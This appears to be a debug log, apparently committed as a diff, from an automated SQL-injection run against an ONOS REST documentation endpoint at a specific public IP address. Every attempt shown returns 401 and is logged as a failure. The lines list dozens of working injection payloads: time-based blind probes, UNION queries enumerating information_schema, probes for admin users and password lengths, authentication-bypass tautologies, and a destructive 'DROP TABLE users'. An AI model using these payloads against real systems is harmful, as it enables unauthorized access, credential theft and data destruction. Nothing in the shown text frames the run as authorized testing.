+2024-12-18 21:24:21,805 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:21,806 - DEBUG - Falha com payload: 'onos' OR SLEEP(5)--' - Status: Sem resposta
+2024-12-18 21:24:21,807 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:22,166 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:22,167 - DEBUG - Falha com payload: 'onos' AND IF(1=1, SLEEP(5), 0)--' - Status: Sem resposta
+2024-12-18 21:24:22,177 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:22,549 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:22,550 - DEBUG - Falha com payload: 'onos' AND BENCHMARK(1000000, MD5(1))--' - Status: Sem resposta
+2024-12-18 21:24:22,551 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:22,902 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:22,906 - DEBUG - Falha com payload: 'onos' OR (SELECT IF(LENGTH(database())>5, SLEEP(5), 0))--' - Status: Sem resposta
+2024-12-18 21:24:22,915 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:23,271 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:23,273 - DEBUG - Falha com payload: 'onos' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--' - Status: Sem resposta
+2024-12-18 21:24:23,275 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:23,623 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:23,625 - DEBUG - Falha com payload: 'onos' UNION SELECT schema_name, null FROM information_schema.schemata--' - Status: Sem resposta
+2024-12-18 21:24:23,631 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:23,983 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:23,986 - DEBUG - Falha com payload: 'onos' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='database_name'--' - Status: Sem resposta
+2024-12-18 21:24:23,987 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:24,347 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:24,348 - DEBUG - Falha com payload: 'onos' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--' - Status: Sem resposta
+2024-12-18 21:24:24,349 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:24,701 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:24,701 - DEBUG - Falha com payload: 'onos' UNION SELECT table_schema, table_name FROM information_schema.tables--' - Status: Sem resposta
+2024-12-18 21:24:24,702 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:25,055 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:25,056 - DEBUG - Falha com payload: 'onos' AND (SELECT COUNT(*) FROM information_schema.tables)>10--' - Status: Sem resposta
+2024-12-18 21:24:25,065 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:25,407 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:25,409 - DEBUG - Falha com payload: 'onos' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_name LIKE '%user%'--' - Status: Sem resposta
+2024-12-18 21:24:25,413 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:25,760 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:25,761 - DEBUG - Falha com payload: 'onos' UNION SELECT 1, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%'--' - Status: Sem resposta
+2024-12-18 21:24:25,762 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:26,109 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:26,109 - DEBUG - Falha com payload: 'onos' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'--' - Status: Sem resposta
+2024-12-18 21:24:26,111 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:26,455 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:26,456 - DEBUG - Falha com payload: 'onos' UNION SELECT COUNT(*), null FROM information_schema.columns WHERE table_schema='database_name'--' - Status: Sem resposta
+2024-12-18 21:24:26,457 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:26,804 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:26,805 - DEBUG - Falha com payload: 'onos' OR 1=(SELECT COUNT(*) FROM users)--' - Status: Sem resposta
+2024-12-18 21:24:26,806 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:27,151 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:27,151 - DEBUG - Falha com payload: 'onos' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--' - Status: Sem resposta
+2024-12-18 21:24:27,153 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:27,499 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:27,501 - DEBUG - Falha com payload: 'onos' OR (SELECT MAX(LENGTH(password)) FROM users)>10--' - Status: Sem resposta
+2024-12-18 21:24:27,502 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:27,853 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:27,854 - DEBUG - Falha com payload: 'onos' AND (SELECT SUM(LENGTH(password)) FROM users)=100--' - Status: Sem resposta
+2024-12-18 21:24:27,855 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:28,200 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:28,201 - DEBUG - Falha com payload: 'onos" OR "1"="1--' - Status: Sem resposta
+2024-12-18 21:24:28,202 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:28,559 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:28,560 - DEBUG - Falha com payload: 'onos' OR '1'='1'--' - Status: Sem resposta
+2024-12-18 21:24:28,561 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:28,908 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:28,909 - DEBUG - Falha com payload: 'onos'/**/OR/**/1=1--' - Status: Sem resposta
+2024-12-18 21:24:28,910 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:29,273 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:29,279 - DEBUG - Falha com payload: 'onos'||'1'||'='||'1--' - Status: Sem resposta
+2024-12-18 21:24:29,281 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:29,625 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:29,626 - DEBUG - Falha com payload: 'onos' OR CHAR(49)=CHAR(49)--' - Status: Sem resposta
+2024-12-18 21:24:29,627 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:29,976 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:29,977 - DEBUG - Falha com payload: 'onos' OR 'x'||'y'||'z'='xyz'--' - Status: Sem resposta
+2024-12-18 21:24:29,980 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:30,326 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:30,327 - DEBUG - Falha com payload: 'onos'--' - Status: Sem resposta
+2024-12-18 21:24:30,327 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:30,675 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:30,677 - DEBUG - Falha com payload: 'onos'/*' - Status: Sem resposta
+2024-12-18 21:24:30,677 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:31,024 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:31,025 - DEBUG - Falha com payload: 'onos';--' - Status: Sem resposta
+2024-12-18 21:24:31,025 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:31,378 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:31,379 - DEBUG - Falha com payload: 'onos'; DROP TABLE users;--' - Status: Sem resposta
+2024-12-18 21:24:31,380 - DEBUG - Starting new HTTP connection (1): 34.139.11.27:8181
+2024-12-18 21:24:31,733 - DEBUG - http://34.139.11.27:8181 "GET /onos/v1/docs/index.html HTTP/1.1" 401 483
+2024-12-18 21:24:31,734 - DEBUG - Falha com payload: 'onos' OR 1=1;--' - Status: Sem resposta
